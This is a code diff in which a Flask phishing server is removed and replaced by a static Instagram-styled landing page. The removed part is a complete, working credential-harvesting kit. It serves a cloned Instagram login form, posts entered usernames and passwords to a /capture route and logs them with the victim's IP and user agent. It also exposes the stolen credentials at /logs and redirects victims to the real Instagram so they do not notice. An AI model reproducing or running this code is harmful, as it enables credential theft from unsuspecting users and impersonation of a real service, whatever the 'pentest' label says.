@@ -1,111 +1,168 @@
-from flask import Flask, request, render_template_string, jsonify, redirect
-import os
-import datetime
-import threading
-
-app = Flask(__name__)
-
-captures = []
-lock = threading.Lock()
-
-# FIXED IG CLONE (with perfect UX)
-IG_CLONE_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in • Instagram</title>
-    <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;}.phone-frame{background:white;border-radius:3px;box-shadow:0 0 20px rgba(0,0,0,0.1);width:350px;padding:40px 40px 20px;}.logo{font-size:45px;font-weight:700;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);--webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:33px;line-height:1;}input{width:100%;height:36px;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;padding:9px 8px;font-size:14px;margin-bottom:6px;box-sizing:border-box;}input:focus{border-color:#b2b2b2;background:white;outline:none;}.login-btn{width:100%;height:30px;background:#0095f6;color:white;border:none;border-radius:5px;font-weight:600;cursor:pointer;margin:8px 0;font-size:14px;}.login-btn:hover:not(:disabled){background:#1877f2;}.login-btn:disabled{background:#b2b2b2;cursor:not-allowed;}.forgot{display:block;text-align:center;color:#00376b;font-size:12px;text-decoration:none;margin:15px 0;}.spinner{display:none;width:20px;height:20px;border:2px solid #f3f3f3;border-top:2px solid #0095f6;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 10px;}.status{text-align:center;color:#8e8e8e;font-size:14px;margin-top:20px;}.or{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:13px;}.or:before,.or:after{content:'';flex:1;border-bottom:1px solid #efefef;}.or span{padding:0 20px;background:white;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Pacifico&display=swap" rel="stylesheet">
 </head>
+<style>
+    /* Reset */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Roboto', sans-serif;
+}
+
+body {
+    background-color: #121212;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+
+.container {
+    width: 100%;
+    max-width: 420px;
+    padding: 20px;
+    text-align: center;
+}
+
+/* Language Selector */
+.language-selector {
+    font-size: 14px;
+    margin-bottom: 20px;
+    cursor: pointer;
+}
+
+/* Logo */
+.logo {
+    font-family: 'Pacifico', cursive;
+    font-size: 50px;
+    margin-bottom: 20px;
+}
+
+/* Subtitle */
+.subtitle {
+    font-size: 16px;
+    color: #fff;
+    margin-bottom: 30px;
+}
+
+.subtitle span {
+    background: linear-gradient(to right, #f58529, #dd2a7b, #8134af);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+/* Button */
+.btn-open {
+    display: block;
+    width: 100%;
+    padding: 12px 0;
+    background-color: #405DE6;
+    color: white;
+    font-size: 16px;
+    border: none;
+    border-radius: 8px;
+    margin-bottom: 20px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.btn-open:hover {
+    background-color: #3144c8;
+}
+
+/* Login Text */
+.login-text {
+    font-size: 14px;
+    margin-bottom: 40px;
+}
+
+.login-link, .signup-link {
+    color: #0095F6;
+    text-decoration: none;
+}
+
+.login-link:hover, .signup-link:hover {
+    text-decoration: underline;
+}
+
+/* Mobile Navigation */
+.mobile-nav {
+    display: flex;
+    justify-content: space-around;
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+    max-width: 420px;
+    background-color: #181818;
+    padding: 10px 0;
+}
+
+.nav-icon {
+    font-size: 24px;
+    cursor: pointer;
+}
+
+/* Responsive Desktop */
+@media(min-width: 600px){
+    body {
+        background-color: #fafafa;
+        color: #000;
+    }
+
+    .container {
+        margin: 50px auto;
+        padding: 40px;
+        border: 1px solid #dbdbdb;
+        border-radius: 8px;
+        background-color: #fff;
+        text-align: center;
+    }
+
+    .subtitle span {
+        background: none;
+        color: #c13584;
+        -webkit-text-fill-color: unset;
+    }
+
+    .btn-open {
+        background-color: #3897f0;
+        color: #fff;
+    }
+
+    .mobile-nav {
+        display: none;
+    }
+}
+
+</style>
 <body>
-    <div class="phone-frame">
-        <div class="logo">Instagram</div>
-        <form id="loginForm">
-            <input name="username" type="text" placeholder="Phone number, username, or email" required>
-            <input name="password" type="password" placeholder="Password" required>
-            <button type="submit" class="login-btn">Log in</button>
-        </form>
-        <a href="#" class="forgot">Forgot password?</a>
-        <div class="or"><span>OR</span></div>
-        <div class="spinner" id="spinner"></div>
-        <div class="status" id="status">Get the app to follow what's happening</div>
+    <div class="container">
+        <div class="language-selector">English ▼</div>
+        
+        <h1 class="logo">Instagram</h1>
+        <p class="subtitle">Share what you’re into <span>with the people who get you.</span></p>
+
+        <button class="btn-open">Open Instagram</button>
+
+        <p class="login-text">
+            <a href="#" class="login-link">Log in</a> or <a href="#" class="signup-link">sign up</a>
+        </p>
+
+        <div class="mobile-nav">
+            <div class="nav-icon">🏠</div>
+            <div class="nav-icon">✈️</div>
+            <div class="nav-icon">▶️</div>
+            <div class="nav-icon">🔍</div>
+            <div class="nav-icon">👤</div>
+        </div>
     </div>
-    <script>
-        document.getElementById("loginForm").addEventListener("submit", async function(e) {
-            e.preventDefault();
-            const btn = this.querySelector(".login-btn");
-            const spinner = document.getElementById("spinner");
-            const status = document.getElementById("status");
-            btn.disabled = true;
-            btn.textContent = "Logging in...";
-            spinner.style.display = "block";
-            status.textContent = "Please wait while we log you in securely...";
-            try {
-                const formData = new FormData(this);
-                const response = await fetch("/capture", {method: "POST", body: formData});
-                const data = await response.json();
-                if (data.success) {
-                    status.textContent = "Login successful! Loading your feed...";
-                    setTimeout(() => { window.location.href = data.redirect || "https://www.instagram.com/"; }, 1500);
-                    return;
-                }
-            } catch (error) {
-                console.error("Capture:", error);
-            }
-            status.textContent = "Please try again.";
-            btn.disabled = false;
-            btn.textContent = "Log in";
-            spinner.style.display = "none";
-        });
-    </script>
 </body>
 </html>
-'''
-
-def log_capture(username, password, user_agent, ip):
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with lock:
-        capture = {'timestamp': timestamp, 'username': username, 'password': password, 'ip': ip, 'user_agent': user_agent[:100] + '...' if len(user_agent) > 100 else user_agent}
-        captures.append(capture)
-        print("=" * 80)
-        print(f"[{timestamp}] 🎣 PHISH HIT")
-        print(f"👤 User: {username}")
-        print(f"🔑 Pass: {password}")
-        print(f"🌐 IP:   {ip}")
-        print(f"📱 UA:   {capture['user_agent']}")
-        print(f"🔄 Victim redirected to instagram.com/")
-        print(f"📊 Total: {len(captures)}")
-        print("=" * 80)
-
-@app.route('/', methods=['GET'])
-def index():
-    return render_template_string(IG_CLONE_HTML)
-
-@app.route('/capture', methods=['POST'])
-def capture():
-    username = request.form.get('username', 'N/A')
-    password = request.form.get('password', 'N/A')
-    ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    log_capture(username, password, user_agent, ip)
-    # ✅ PERFECT UX: JSON success + client-side redirect
-    return jsonify({'success': True, 'message': 'Login successful', 'redirect': 'https://www.instagram.com/'}), 200
-
-@app.route('/logs')
-def logs():
-    return jsonify({'total_captures': len(captures), 'captures': captures})
-
-@app.route('/status')
-def status():
-    return jsonify({'status': '🚀 ACTIVE', 'total_captures': len(captures)})
-
-@app.route('/<path:path>')
-def catch_all(path):
-    return redirect('/', code=302)
-
-if __name__ == '__main__':
-    print("🔒 PENTEST SERVER READY")
-    print("🌐 http://127.0.0.1:5000")
-    print("📊 http://127.0.0.1:5000/logs")
-    app.run(host='0.0.0.0', port=5000, debug=False)
